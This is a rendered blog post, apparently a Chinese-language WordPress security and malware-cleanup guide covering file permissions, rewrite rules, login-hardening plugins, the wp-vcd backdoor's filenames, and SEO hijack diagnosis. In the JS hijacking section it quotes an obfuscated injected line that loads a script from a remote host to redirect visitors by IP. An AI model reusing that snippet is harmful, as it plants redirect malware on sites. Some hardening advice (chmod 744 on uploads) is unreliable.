@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <title>
+         - my101du Blog
+      </title>
+        <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    
+    <meta name="theme-color" content="#000000" />
+    
+    <meta http-equiv="window-target" content="_top" />
+    
+    
+    <meta name="description" content="wordpress安全 permalin: wordpress-security tags: wordpress 服务器、用户、文件与目录 文件 上级目录 如 /home/wwwroot 属于 root chown www:www /home/wwwroot 修改整个 WP 目录为 web 服务器的用户 （nginx 、apache）" />
+    <meta name="generator" content="Hugo 0.70.0 with theme pure" />
+    <title> - my101du Blog</title>
+    
+    
+    <link rel="stylesheet" href="http://blog.zhishibee.com/css/style.min.7dc20efbc53647d41aa9ddea0c48e59300223d084e66ea0cbe7c30bd88903acc.css">
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+    <meta property="og:title" content="" />
+<meta property="og:description" content="wordpress安全 permalin: wordpress-security tags: wordpress 服务器、用户、文件与目录 文件 上级目录 如 /home/wwwroot 属于 root chown www:www /home/wwwroot 修改整个 WP 目录为 web 服务器的用户 （nginx 、apache）" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://blog.zhishibee.com/1/01/wordpress%E5%AE%89%E5%85%A8/" />
+
+<meta itemprop="name" content="">
+<meta itemprop="description" content="wordpress安全 permalin: wordpress-security tags: wordpress 服务器、用户、文件与目录 文件 上级目录 如 /home/wwwroot 属于 root chown www:www /home/wwwroot 修改整个 WP 目录为 web 服务器的用户 （nginx 、apache）">
+
+<meta itemprop="wordCount" content="3294">
+
+
+
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="wordpress安全 permalin: wordpress-security tags: wordpress 服务器、用户、文件与目录 文件 上级目录 如 /home/wwwroot 属于 root chown www:www /home/wwwroot 修改整个 WP 目录为 web 服务器的用户 （nginx 、apache）"/>
+
+    <!--[if lte IE 9]>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+      <![endif]-->
+
+    <!--[if lt IE 9]>
+        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+      <![endif]-->
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="https://github.com/my101du" target="_blank">
+            <img class="img-circle img-rotate" src="https://avatars2.githubusercontent.com/u/1332645?s=460&amp;u=dc114d6baad010456a5af87c4cc2df0694ff2b1c&amp;v=4" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">my101du</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Dongguan, China</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="想要查找什么..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Archives</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-categories">
+                <a href="/categories/">
+                    <i class="icon icon-folder"></i>
+                  <span class="menu-title">Categories</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-about">
+                <a href="/about/">
+                    <i class="icon icon-cup-fill"></i>
+                  <span class="menu-title">About</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content"><p>enjoy~</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+      <div class="widget">
+    <h3 class="widget-title"> 分类</h3>
+    <div class="widget-body">
+        <ul class="category-list">
+        </ul>
+    </div>
+</div>
+      <div class="widget">
+    <h3 class="widget-title"> 标签</h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+        </ul>
+
+    </div>
+</div>
+      
+<div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="http://blog.zhishibee.com/1/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/" class="title"></a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="0001-01-01 00:00:00 &#43;0000 UTC" itemprop="datePublished">0001-01-01</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="http://blog.zhishibee.com/1/01/bootstrap-%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5%E4%B8%8E%E6%8A%80%E5%B7%A7/" class="title"></a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="0001-01-01 00:00:00 &#43;0000 UTC" itemprop="datePublished">0001-01-01</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="http://blog.zhishibee.com/1/01/bootstrap4/" class="title"></a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="0001-01-01 00:00:00 &#43;0000 UTC" itemprop="datePublished">0001-01-01</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="http://blog.zhishibee.com/1/01/css-%E5%8A%A8%E7%94%BB/" class="title"></a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="0001-01-01 00:00:00 &#43;0000 UTC" itemprop="datePublished">0001-01-01</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="http://blog.zhishibee.com/1/01/css-%E5%8A%A8%E7%94%BB%E5%BA%93-animate.css/" class="title"></a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="0001-01-01 00:00:00 &#43;0000 UTC" itemprop="datePublished">0001-01-01</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">文章目录</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h1 itemprop="name">
+  <a
+    class="article-title"
+    href="/1/01/wordpress%E5%AE%89%E5%85%A8/"
+    ></a
+  >
+</h1>
+
+      <div class="article-meta">
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i>&nbsp;<a href="/1/01/wordpress%E5%AE%89%E5%85%A8/#comments"
+            class="article-comment-link">评论</a></span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 3294字</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 7分 </span>
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <p>wordpress安全</p>
+<p>permalin: wordpress-security
+tags:</p>
+<ul>
+<li>wordpress</li>
+</ul>
+<hr>
+<!-- raw HTML omitted -->
+<h1 id="服务器用户文件与目录">服务器、用户、文件与目录</h1>
+<h2 id="文件">文件</h2>
+<h3 id="上级目录-如-homewwwroot-属于-root">上级目录 如 /home/wwwroot 属于 root</h3>
+<pre><code class="language-shell">chown www:www /home/wwwroot
+</code></pre>
+<h3 id="修改整个-wp-目录为-web-服务器的用户-nginx-apache">修改整个 WP 目录为 web 服务器的用户 （nginx 、apache）</h3>
+<p>例如 www:www</p>
+<pre><code class="language-shell">$ chown -R [webuser]:[mygroup] *
+$ chmod -R g+w *
+
+chown www-data:www-data -R *	
+</code></pre>
+<h3 id="修改目录文件权限">修改目录、文件权限</h3>
+<p>r w x
+4 2 1</p>
+<p>目录</p>
+<p>允许 www 用户 读、写、执行（进入下级目录）
+非 www 用户 只能读、执行，不能修改目录内容</p>
+<p>文件</p>
+<p>www 用户只能读、写，不能执行命令
+非 www 用户只能读</p>
+<pre><code class="language-shell">find . -type d -exec chmod 755 {} \;
+find . -type f -exec chmod 644 {} \;
+</code></pre>
+<h3 id="修改-wp-configphp-只有-root-可以修改">修改 wp-config.php 只有 root 可以修改</h3>
+<pre><code class="language-shell">$ chown root:root wp-config.php
+$ chmod 644 wp-config.php
+</code></pre>
+<h3 id="查找-uploads-目录下有哪些-php-文件">查找 uploads 目录下有哪些 php 文件</h3>
+<p>（一般情况下这里只允许出现静态文件，如图片等）， 不过对于伪装成 jpeg 的木马，无能为力</p>
+<pre><code class="language-shell">find ./wp-content/uploads -name &quot;*.php&quot; -print
+</code></pre>
+<h3 id="禁止-uploads-下文件执行">禁止 uploads 下文件执行</h3>
+<p>黑客可以上传可执行的木马文件到 uploads 目录，通过某种方法执行木马文件，获取服务器的管理员权限。</p>
+<p>禁止上传的文件能被执行</p>
+<pre><code class="language-shell">chmod 744 -R wp-content/uploads/
+</code></pre>
+<h2 id="nginx-限制一些目录">NGINX 限制一些目录</h2>
+<p>nginx的location禁止任何用户访问wp-include的文件</p>
+<p>可以用 iThemes 生成 config 的文件来让 NGINX 加载</p>
+<pre><code class="language-shell"># Block the include-only files.
+RewriteEngine On
+RewriteBase /
+RewriteRule ^wp-config\.php - [F,L]
+RewriteRule ^wp-admin/includes/ - [F,L]
+RewriteRule !^wp-includes/ - [S=3]
+RewriteRule ^wp-includes/[^/]+\.php$ - [F,L]
+RewriteRule ^wp-includes/js/tinymce/langs/.+\.php - [F,L]
+RewriteRule ^wp-includes/theme-compat/ - [F,L]
+</code></pre>
+<h1 id="登录与注册加强">登录与注册加强</h1>
+<h2 id="强密码与定期修改">强密码与定期修改</h2>
+<h2 id="验证码">验证码</h2>
+<p>SI CAPTCHA Anti-Spam 貌似搜不到了</p>
+<h2 id="手机号注册">手机号注册</h2>
+<p><a href="https://www.ludou.org/wordpress-register-check-user-phone-via-sms.html">https://www.ludou.org/wordpress-register-check-user-phone-via-sms.html</a></p>
+<p>阿里云短信服务需要一个阿里云账户，也可以用淘宝账号登陆，没有的可以自己注册一个；
+登陆阿里云后台：登陆地址；
+新使用的阿里云短信，阿里云会赠送一个有效期一个月的10元代金券，可以抵扣短信费。代金券使用完后需充值才能继续使用短信服务；
+在阿里云控制台的 秘钥管理页面(<a href="https://ak-console.aliyun.com/?spm=5176.doc55451.2.3.qhYHau#/accesskey">https://ak-console.aliyun.com/?spm=5176.doc55451.2.3.qhYHau#/accesskey</a>)，点击 创建Access Key(新版的还有个什么子账号，不管他)，并且确保处于 启用 状态，获取到 AccessKeyId 与 AccessKeySecret；
+在阿里云 短信签名页面，添加短信签名，签名类型选择&quot;验证码或短信通知&rdquo;，签名填你的网站名称。
+不懂的可以看阿里云的文档：申请短信签名；
+在阿里云 短信模板页面，添加短信模板，模板类型选择&quot;验证码&rdquo;，模版名称自己填，模版内容可自行发挥，将验证码用变量${code}代替即可。如你可以设置模板内容为：
+${code} 这是您的短信验证码，10分钟内有效。 或 验证码 ${code}
+不懂的可以看阿里云的文档：申请短信模板
+短信签名和短信模板待阿里云审核通过后，记住签名名称和模版CODE；
+点此下载插件，并解压；
+用文本编辑器（没有就用记事本）打开ludou-phone-register/config.php，按照注释替换成你的AccessKeyId、AccessKeySecret、签名名称和模版CODE，修改后类似：</p>
+<h2 id="社会化网站微信qq">社会化网站（微信、QQ）</h2>
+<p><a href="https://wordpress.org/plugins/wechat-social-login/">https://wordpress.org/plugins/wechat-social-login/</a></p>
+<p>例如微信登录（PC+微信端），需要去开放平台申请 key</p>
+<p>开放平台内必须关联公众号，否则同个微信号会创建两个账户</p>
+<p><img src="/media/15490412569909/15199572115284.jpg" alt=""></p>
+<p>注意提示</p>
+<p><img src="/media/15490412569909/15199572756463.jpg" alt=""></p>
+<p>代替默认的登录页</p>
+<p><img src="/media/15490412569909/15199575412827.jpg" alt=""></p>
+<h2 id="限制登录尝试-limit-login-attempts">限制登录尝试 Limit Login Attempts</h2>
+<h1 id="all-in-one-wp-security--firewall">All In One WP Security &amp; Firewall</h1>
+<p>也有登录、注册验证码功能</p>
+<p><a href="https://www.jianshu.com/p/fc77a0c77e54">https://www.jianshu.com/p/fc77a0c77e54</a></p>
+<h1 id="wordfence-security--firewall--malware-scan">Wordfence Security – Firewall &amp; Malware Scan</h1>
+<p><img src="/media/15490412569909/15500397043469.jpg" alt="-w536"></p>
+<p>安装完后，填写一个接受安全提醒的邮箱。</p>
+<p>免费版的不能实时保护。</p>
+<h2 id="configuration-firewall">Configuration Firewall</h2>
+<p><img src="/media/15490412569909/15500406168883.jpg" alt="-w750"></p>
+<h3 id="ini-保护执行目录">ini 保护执行目录</h3>
+<p><img src="/media/15490412569909/15500405549231.jpg" alt="-w481"></p>
+<h2 id="scan-扫描恶意文件">Scan 扫描恶意文件</h2>
+<p>点击开始扫描</p>
+<p><img src="/media/15490412569909/15500407384925.jpg" alt="-w1057"></p>
+<h1 id="itheme">iTheme</h1>
+<h2 id="隐藏后台登录地址">隐藏后台登录地址</h2>
+<h3 id="设置新的后台地址">设置新的后台地址</h3>
+<p>点开“advanced”tab，找到 “Hide Backend”，填写一个新的地址，例如“bv38_dk14”这种很难猜到的。</p>
+<p>保存的时候会提示需要生成/覆盖一个在网站根目录下的 <code>nginx.conf</code>文件，注意，这个不是你 web 服务器 nginx 的配置文件，而是只对这个网站有效的。</p>
+<p>没有的话，创建一个并给 web 用户可写权限。</p>
+<h3 id="确认已经生效">确认已经生效</h3>
+<p>打开这个文件，可以看到里面有屏蔽恶意 IP，让 wp-content/uploads 里面的 php 文件禁止运行等。都是 iTheme Security 自动生成。</p>
+<p>最后几行类似如下，就表示配置参数已经写入到文件了</p>
+<pre><code class="language-shell"># Enable the hide backend feature - Security &gt; Settings &gt; Hide Login Area &gt; Hide Backend
+rewrite ^(/)?bv38_dk14/?$ /wp-login.php?$query_string break;
+rewrite ^(/)?wp-register-php/?$ /bv38_dk14?action=register break;
+</code></pre>
+<h3 id="最后要在nginx-的-vhosts-配置中引用它">最后要在nginx 的 vhosts 配置中引用它</h3>
+<p>编辑你的网站配置文件 <code>/usr/local/nginx/config/vhosts/example.org.conf</code>，在里面添加一行(除了 wordpress 的基本 rewrite 规则，另加一行)</p>
+<pre><code class="language-shell">include /home/wwwroot/example.org/nginx.conf;
+</code></pre>
+<h3 id="重新加载-nginx-配置文件或者重启-nginx">重新加载 nginx 配置文件，或者重启 nginx</h3>
+<p>略</p>
+<h2 id="如果自己的-ip-尝试次数过多被锁住了如何解锁">如果自己的 IP 尝试次数过多被锁住了如何解锁</h2>
+<p><a href="https://ithemes.com/security/fixing-ithemes-security-lockouts/">https://ithemes.com/security/fixing-ithemes-security-lockouts/</a></p>
+<p>找到表<code>xxxxxx_itsec_lockouts</code>，删除相关记录即可</p>
+<h2 id="其他选项">其他选项</h2>
+<p>在<code>wp-options</code>表中，找到<code>option-name</code>为“itsec-storage”的记录，里面存储了设置参数。</p>
+<h2 id="restful-接口设置">RESTFul 接口设置</h2>
+<p>如果没访问权限，报错</p>
+<pre><code class="language-json">{
+    &quot;code&quot;: &quot;itsec_rest_api_access_restricted&quot;,
+    &quot;message&quot;: &quot;You do not have sufficient permission to access this endpoint. Access to REST API requests is restricted by iThemes Security settings.&quot;,
+    &quot;data&quot;: null
+}
+</code></pre>
+<p><strong>System tweaks</strong></p>
+<p><img src="/media/15490412569909/15375116421030.jpg" alt="-w672"></p>
+<p>还有 <a href="https://ithemes.com/security/wordpress-rest-api-restrict-access/">https://ithemes.com/security/wordpress-rest-api-restrict-access/</a></p>
+<p><strong>Wordpress tweaks</strong></p>
+<p>找到 REST API 部分</p>
+<p>Restricted Access setting  表示不公开 post 等内容，必须要登录用户才有权限
+<strong>Default</strong> Access 表示post user 等信息可以公开访问（改成这个）</p>
+<h1 id="sucuri-security">Sucuri Security</h1>
+<p><img src="/media/15490412569909/15500397432306.jpg" alt="-w522"></p>
+<p>1</p>
+<h1 id="技术资料安全相关">技术资料（安全相关）</h1>
+<p><a href="https://www.getastra.com/blog/category/cms/wordpress-security/">https://www.getastra.com/blog/category/cms/wordpress-security/</a></p>
+<h1 id="wp-vcd-恶意后门">wp-vcd 恶意后门</h1>
+<p>有一次发现 wp 怎么都不爆 500 错误的详细信息，即使已经在 php.ini php-fpm 和 wp-config.php 等地方都打开了开关。</p>
+<p>在搜索 <code>display_errors</code>的时候，偶然发现一个文件 <code>wp-includes/wp-vcd.php</code></p>
+<p>里面禁用了 error_reporting  再看代码详情，发现是远程请求。</p>
+<p>对比这个文件，并不是 wp 自带的。。。</p>
+<p>查询了下这个的信息，原来是个后门。。。。</p>
+<p><a href="https://www.getastra.com/blog/911/how-to-fix-wp-vcd-backdoor-hack-in-wordpress-functions-php/">https://www.getastra.com/blog/911/how-to-fix-wp-vcd-backdoor-hack-in-wordpress-functions-php/</a></p>
+<p>还有其他 wp-xx 的文件，也是木马
+wp-includes/wp-tmp.php
+wp-content/themes/*/functions.php
+class.theme-modules.php
+class.wp.php
+admin.txt
+codexc.txt
+code1.php
+class.theme-modules.php (inside the theme folder)</p>
+<p>这里还发现了引用， post.php  看来要大清洗了</p>
+<p><img src="/media/15490412569909/15476074075522.jpg" alt="-w717"></p>
+<p>theme/the7/functions.php 被插入代码</p>
+<p><img src="/media/15490412569909/15476188058825.jpg" alt="-w575"></p>
+<h1 id="网站挂马劫持经典案例分析黑链清除思路">网站挂马劫持经典案例分析【黑链清除思路】</h1>
+<p><a href="http://www.vuln.cn/2831">http://www.vuln.cn/2831</a></p>
+<p>一般网站劫持会被用来发布灰色广告，或者被用来做黑帽SEO。之所以你的网站被入侵，是挂马者使用批量getshell工具，根据某个漏洞来批量拿到具有相同漏洞的网站，然后再将相关劫持代码加入到你的网站程序中，而这一系列动作都是用工具批量完成。
+其实在我看来，如果发现你的网站被挂马劫持，你其实可以乐观一点，起码你会知道你的网站存在严重的漏洞，却只是被工具劫持了，而不是被同行所利用，如果被专门的入侵者拿下，一般就不会简简单单的给你挂个马了，具体会严重的什么程度？这要看心情了，不开玩笑，而恰巧你又不太懂，如果木马隐藏的好，这匹马将伴随你终身，白头到老。</p>
+<h2 id="症状">症状</h2>
+<p>一般你会在搜索结果搜索相关关键词，或者自己的网址，看到的标题可能不是自己的网站标题，点击进去可能会跳转到其他地方，或者进去后发现网站已物是人非。</p>
+<p>这种情况很明显挂马脚本对user-agent进行了判断，如果user-agent是百度蜘蛛，那么将返回广告。
+一般会在网站程序插入JS，或者在php或者其他程序中插入代码，如果是js，一般只要远程调用一个就可以实现劫持，插入代码量很少。</p>
+<h2 id="第一步审核元素中查看网络连接">第一步：审核元素中查看网络连接</h2>
+<p>正常打开的时候先看看没有加载异常的脚本</p>
+<p>加载的js都打开简单看下没有发现异常的脚本，</p>
+<p>可能隐藏在现有的JS中，一般隐藏也是加密后的，比较难以发现</p>
+<p><img src="/media/15490412569909/15500450142083.png" alt=""></p>
+<h2 id="第二步抓包分析">第二步：抓包分析</h2>
+<p>第一步没有直接分析出来，一般要么马隐藏的深，要么就是根本不是用的JS，那么需要抓包分析</p>
+<p>抓包略</p>
+<p>重现跳转场景</p>
+<p>设置浏览器user-agent 为百度蜘蛛</p>
+<p>用burpsuite抓一下看看，不过要先配置下不过滤JS脚本，</p>
+<h2 id="js-挂马">js 挂马</h2>
+<p><a href="https://segmentfault.com/a/1190000009232130">https://segmentfault.com/a/1190000009232130</a></p>
+<p>网站打开一会就自动跳转到其他页面，而且这个问题是你的用户告诉你的，而你<strong>自己却没有遇到</strong>?</p>
+<p>挂马者是通过在discuz的头部js文件里面添加了劫持js代码，通过判断访问者的IP来实现不同跳转的。</p>
+<p>具体代码如下：</p>
+<pre><code class="language-js">document.write(&quot;&lt;163&quot;+&quot;cript src='http://141&quot;+&quot;d.172&quot;+&quot;om&quot;+&quot;1263&quot;+&quot;.n&quot;+&quot;et/i&quot;+&quot;p.asp?l&quot;+&quot;oc=chengdu'&gt;&lt;/s&quot;+&quot;cript&gt;&quot;);
+</code></pre>
+<p>IP为成都地区的访问者在访问被挂马页面时不做跳转。其余地区的IP访问者则跳转。 根据你网站所在地进行判断网站管理员经常使用的IP地址所在地，然后有针对性的对网站管理员不做跳转劫持</p>
+<p>校验下原始文件，对比下哪些js文件近期有被改动过，然后针对被改动过的js文件做以上代码段的排除。找到以上代码段后，删除即可。</p>
+<h1 id="cdn-加-应对-cc">CDN 加 应对 CC</h1>
+<p><a href="https://yii.im/posts/how-to-defense-cc-attack-for-wordpress-site/">https://yii.im/posts/how-to-defense-cc-attack-for-wordpress-site/</a></p>
+<h1 id="最关键的备份-备份-备份">最关键的：备份 备份 备份</h1>
+<h1 id="参考">参考</h1>
+<p><a href="https://www.zhihu.com/question/30419828">https://www.zhihu.com/question/30419828</a></p>
+<p><a href="http://www.wpbeginner.com/wp-tutorials/how-to-find-a-backdoor-in-a-hacked-wordpress-site-and-fix-it/">http://www.wpbeginner.com/wp-tutorials/how-to-find-a-backdoor-in-a-hacked-wordpress-site-and-fix-it/</a></p>
+<p><a href="http://www.wpbeginner.com/plugins/how-to-scan-your-wordpress-site-for-potentially-malicious-code/">http://www.wpbeginner.com/plugins/how-to-scan-your-wordpress-site-for-potentially-malicious-code/</a></p>
+<p><a href="https://premium.wpmudev.org/blog/limit-access-login-page/">https://premium.wpmudev.org/blog/limit-access-login-page/</a></p>
+<p><a href="https://www.elegantthemes.com/blog/tips-tricks/how-to-scan-your-wordpress-website-for-hidden-malware">https://www.elegantthemes.com/blog/tips-tricks/how-to-scan-your-wordpress-website-for-hidden-malware</a></p>
+<p><a href="https://wpscans.com/scan">https://wpscans.com/scan</a>
+<a href="https://www.acunetix.com/vulnerability-scanner/online-scanner/">https://www.acunetix.com/vulnerability-scanner/online-scanner/</a>
+<a href="https://cn.bluehost.com/blog/wordpress/1345.html">https://cn.bluehost.com/blog/wordpress/1345.html</a></p>
+<p><a href="https://www.bbsmax.com/A/n2d960XozD/">https://www.bbsmax.com/A/n2d960XozD/</a></p>
+<p>一般来说，目前所遇到的插件木马是使用js代码放置到前端，产生恶意链接、恶意跳转等方式劫持你的网站，而这些代码往往是放置在前端 的，或者使�php代码将js输出到前端。
+我们要清除这些恶意代码有几种方式可以解决：
+1.从官方下载最新版本的wordpress，直接覆盖。</p>
+<p>覆盖时，wp-includes文件夹、wp-admin以及根目录的文件和文件夹可以直接覆盖掉。</p>
+<p>重新链接一次数据库，这样数据不会丢失，并且会消除掉这些文件夹可能携带的木马。</p>
+<p>如件覆盖之后，还是没有消除掉木马，可以逐个停用插件，逐个停用主题，排查木马所在位置。找到木马，并将其清除掉。</p>
+<p>WordPress终极安全指南
+<a href="https://zhuanlan.zhihu.com/p/33754392">https://zhuanlan.zhihu.com/p/33754392</a></p>
+<p>几点建议
+<a href="https://zhuanlan.zhihu.com/p/21339752">https://zhuanlan.zhihu.com/p/21339752</a></p>
+<p>被挂木马怎么办
+<a href="https://zhuanlan.zhihu.com/p/27131415">https://zhuanlan.zhihu.com/p/27131415</a></p>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接: </strong>
+      <a href="http://blog.zhishibee.com/1/01/wordpress%E5%AE%89%E5%85%A8/" title="" target="_blank" rel="external">http://blog.zhishibee.com/1/01/wordpress%E5%AE%89%E5%85%A8/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License：</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/my101du" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="https://avatars2.githubusercontent.com/u/1332645?s=460&amp;u=dc114d6baad010456a5af87c4cc2df0694ff2b1c&amp;v=4" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/my101du" target="_blank"><span class="text-dark">my101du</span><small class="ml-1x"></small></a></h3>
+        <div>Stay Hungry, Stay Foolish</div>
+      </div>
+    </figure>
+  </div>
+</div>
+    </div>
+  </article>
+<section id="comments">
+</section>
+
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="http://blog.zhishibee.com/1/01/wordpress%E6%8F%92%E4%BB%B6-%E5%86%85%E5%AE%B9%E7%BC%96%E8%BE%91%E5%A2%9E%E5%BC%BA/" title=""><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;下一篇</span></a>
+            </li>
+            <li class="next">
+                <a href="http://blog.zhishibee.com/1/01/wordpress-%E9%BB%98%E8%AE%A4%E7%89%B9%E6%80%A7%E9%AD%94%E6%94%B9/"
+                    title=""><span>上一篇&nbsp;&nbsp;</span><i
+                        class="icon icon-angle-right" aria-hidden="true"></i></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="文章目录" role="button">
+                    <span>[&nbsp;</span><span>文章目录</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        <div class="bar-right">
+            <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter"
+                data-mobile-sites="weibo,qq,qzone"></div>
+        </div>
+    </div>
+</nav>
+
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+<ul class="social-links">
+    <li><a href="https://github.com/my101du" target="_blank" title="github" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-github"></i></a></li>
+    <li><a href="http://blog.zhishibee.com/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-rss"></i></a></li>
+</ul>
+  <div class="copyright">
+    &copy;2017  -
+    2020
+    <div class="publishby">
+        Theme by <a href="https://github.com/xiaoheiAh" target="_blank"> xiaoheiAh </a>base on<a href="https://github.com/xiaoheiAh/hugo-theme-pure" target="_blank"> pure</a>.
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/javascript.min.js" defer></script>
